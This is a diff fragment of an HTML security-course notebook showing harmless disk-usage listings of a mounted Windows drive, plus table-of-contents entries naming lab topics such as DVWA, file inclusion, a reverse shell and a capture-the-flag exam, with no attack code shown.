+      [root@sysrescue /mnt/windows]# du -s -BM Program\ Files/Microsoft\ SQL\
+      Server/<br>
+      256M&nbsp;&nbsp;&nbsp; Program Files/Microsoft SQL Server/<br>
+      [root@sysrescue /mnt/windows]# du -s -BM Program\ Files/Microsoft\ SDKs/<br>
+      23M&nbsp;&nbsp;&nbsp; Program Files/Microsoft SDKs/<br>
+    </span>
+    <p><span style="font-family: Courier New,Courier,monospace;">[root@sysrescue
+        /mnt/windows]# <br>
+        [root@sysrescue /mnt/windows]# du -s -BM Program\ Files/Oracle/</span><br>
+      <span style="font-family: Courier New,Courier,monospace;"></span><span style="font-family: Courier New,Courier,monospace;">28M&nbsp;&nbsp;&nbsp;
+        Program Files/Oracle/</span><br>
+      <span style="font-family: Courier New,Courier,monospace;"></span><span style="font-family: Courier New,Courier,monospace;">[root@sysrescue
+        /mnt/windows]# du -s -BM Program\ Files/VS201*</span><br>
+      <span style="font-family: Courier New,Courier,monospace;"></span><span style="font-family: Courier New,Courier,monospace;">1M&nbsp;&nbsp;&nbsp;
+        Program Files/VS2010Schemas</span><br>
+      <span style="font-family: Courier New,Courier,monospace;"></span><span style="font-family: Courier New,Courier,monospace;">1M&nbsp;&nbsp;&nbsp;
+        Program Files/VS2012Schemas</span><br>
+      <span style="font-family: Courier New,Courier,monospace;"></span><span style="font-family: Courier New,Courier,monospace;">[root@sysrescue
+        /mnt/windows]# du -s -BM Program\ Files/dotnet</span><br>
+      <span style="font-family: Courier New,Courier,monospace;"></span><span style="font-family: Courier New,Courier,monospace;">647M&nbsp;&nbsp;&nbsp;
+        Program Files/dotnet</span><br>
+      <span style="font-family: Courier New,Courier,monospace;"></span><span style="font-family: Courier New,Courier,monospace;">[root@sysrescue
+        /mnt/windows]# </span></p>
+    <span style="font-family: Courier New,Courier,monospace;"></span><br>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    &nbsp;
+    <p></p>
     <hr style="width: 100%; height: 4px; color: #330033; margin-left: auto; margin-right: auto;">
     <p><br>
     </p>
@@ -1897,8 +3280,7 @@ color="#4E9A06">)-[</font><font color="#000000"><b>~</b></font><font color="#4E9
                   the CLI with VBoxManage</a></li>
               <li><a href="#mozTocId600163">Pause and resume a virtual machine
                   (VM) from the CLI with VBoxManage</a></li>
-              <li><a href="#mozTocId5825"></a><br>
-              </li>
+              <li><a href="#mozTocId5825"></a></li>
             </ol>
           </li>
           <li><a href="#mozTocId502047">Enumerating an SMB (CIFS) server</a>
@@ -1975,6 +3357,105 @@ color="#4E9A06">)-[</font><font color="#000000"><b>~</b></font><font color="#4E9
       <li><a href="#mozTocId458291">April 29th</a>
         <ol>
           <li><a href="#mozTocId180362">How to create a reverse shell</a></li>
+        </ol>
+      </li>
+      <li><a href="#mozTocId369195">May 2nd</a>
+        <ol>
+          <li><a href="#mozTocId920419">Teach me something</a></li>
+        </ol>
+      </li>
+      <li><a href="#mozTocId590790">May 4th</a>
+        <ol>
+          <li><a href="#mozTocId168957">Working on the vulnerability Scanning 2
+              of 2 lab</a>
+            <ol>
+              <li><a href="#mozTocId839165">How to keep the metasploitable
+                  virtual machine from shutting down after an hour.</a></li>
+              <li><a href="#mozTocId241448">Scan port 8484 - what's running on
+                  it?</a></li>
+              <li><a href="#mozTocId835382">What was the version of that
+                  service?</a></li>
+              <li><a href="#mozTocId666897">Where did you find the code you used
+                  to spawn the reverse shell?</a></li>
+            </ol>
+          </li>
+          <li><a href="#mozTocId560013"></a></li>
+        </ol>
+      </li>
+      <li><a href="#mozTocId484246">May 6th</a>
+        <ol>
+          <li><a href="#mozTocId318816">Deliberately Vulnerable Web Application
+              (DVWA)</a>
+            <ol>
+              <li><a href="#mozTocId78375">Installation</a>
+                <ol>
+                  <li><a href="#mozTocId909583">Installation using docker</a></li>
+                </ol>
+              </li>
+            </ol>
+          </li>
+          <li><a href="#mozTocId424752">Local File Inclusion (LFI) / Remote File
+              Intrustion (RFI</a>
+            <ol>
+              <li><a href="#mozTocId965076">Lab Local File Inclusion</a></li>
+            </ol>
+          </li>
+          <li><a href="#mozTocId564572">Password Attack Lab</a></li>
+        </ol>
+      </li>
+      <li><a href="#mozTocId846677">May 7th</a>
+        <ol>
+          <li><a href="#mozTocId333186">Ben wrote some good advice</a></li>
+        </ol>
+      </li>
+      <li><a href="#mozTocId15569">May 8th</a>
+        <ol>
+          <li><a href="#mozTocId49823">Deliberately Vulnerable Web Application
+              (DVWA)</a></li>
+        </ol>
+      </li>
+      <li><a href="#mozTocId208141">May 9th</a></li>
+      <li><a href="#mozTocId413685"></a></li>
+      <li><a href="#mozTocId637917">May 10th</a>
+        <ol>
+          <li><a href="#mozTocId562442">Reading</a></li>
+        </ol>
+      </li>
+      <li><a href="#mozTocId754834">May 11th</a>
+        <ol>
+          <li><a href="#mozTocId558842">The final exam - capture the flag</a>
+            <ol>
+              <li><a href="#mozTocId714308">Login normally</a>
+                <ol>
+                  <li><a href="#mozTocId120901">A red herring!</a></li>
+                </ol>
+              </li>
+              <li><a href="#mozTocId764524">Break in using the System Rescue CD
+                  version</a>
+                <ol>
+                  <li><a href="#mozTocId14740">Narrative and notes</a>
+                    <ol>
+                      <li><a href="#mozTocId711722">I think I found a Trojan</a></li>
+                      <li><a href="#mozTocId910113">Exploring the VM from the
+                          network side.</a></li>
+                      <li><a href="#mozTocId258846">Exploring the VM from the
+                          inside - running under windows/11</a>
+                        <ol>
+                          <li><a href="#mozTocId586068">What's listening on
+                              which ports?</a></li>
+                          <li><a href="#mozTocId653521">SMB?</a></li>
+                          <li><a href="#mozTocId909290">I installed avast anti
+                              virus software</a></li>
+                        </ol>
+                      </li>
+                    </ol>
+                  </li>
+                  <li><a href="#mozTocId509384">I win a red belt at least!</a></li>
+                </ol>
+              </li>
+            </ol>
+          </li>
+          <li><a href="#mozTocId627062">Critique of the Capture the Flag</a></li>
         </ol>
       </li>
     </ol>
